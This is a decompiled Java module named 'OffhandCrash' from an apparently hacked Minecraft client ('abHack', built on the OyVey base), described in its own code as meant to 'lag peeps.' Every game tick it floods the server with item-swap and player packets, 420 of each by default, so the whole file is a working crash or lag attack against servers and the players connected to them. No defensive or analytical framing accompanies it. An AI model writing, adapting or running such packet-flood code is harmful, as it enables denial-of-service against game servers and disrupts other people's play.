//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\L4J\Desktop\deobf workspace\1.12 stable mappings"!

//Decompiled by Procyon!

package me.abHack.features.modules.misc;

import me.abHack.features.modules.*;
import me.abHack.features.setting.*;
import me.abHack.*;
import net.minecraft.util.math.*;
import net.minecraft.util.*;
import net.minecraft.network.*;
import net.minecraft.network.play.client.*;

public class OffhandCrash extends Module
{
    private final /* synthetic */ Setting<String> speed;
    private final /* synthetic */ Setting<Boolean> escoff;
    
    @Override
    public void onLogout() {
        if (this.escoff.getValue() && OyVey.moduleManager.isModuleEnabled("OffhandCrash")) {
            this.disable();
        }
    }
    
    @Override
    public void onTick() {
        if (OffhandCrash.mc.world == null || OffhandCrash.mc.player == null) {
            return;
        }
        for (int i = 0; i < Integer.valueOf(this.speed.getValue()); ++i) {
            OffhandCrash.mc.player.connection.sendPacket((Packet)new CPacketPlayerDigging(CPacketPlayerDigging.Action.SWAP_HELD_ITEMS, BlockPos.ORIGIN, EnumFacing.UP));
            OffhandCrash.mc.player.connection.sendPacket((Packet)new CPacketPlayer(true));
        }
    }
    
    @Override
    public void onLogin() {
        if (this.escoff.getValue() && OyVey.moduleManager.isModuleEnabled("OffhandCrash")) {
            this.disable();
        }
    }
    
    public OffhandCrash() {
        super("OffhandCrash", "lag peeps.", Category.MISC, false, false, false);
        this.speed = (Setting<String>)this.register(new Setting("Speed", (T)"420"));
        this.escoff = (Setting<Boolean>)this.register(new Setting("EscOff", (T)true));
    }
}
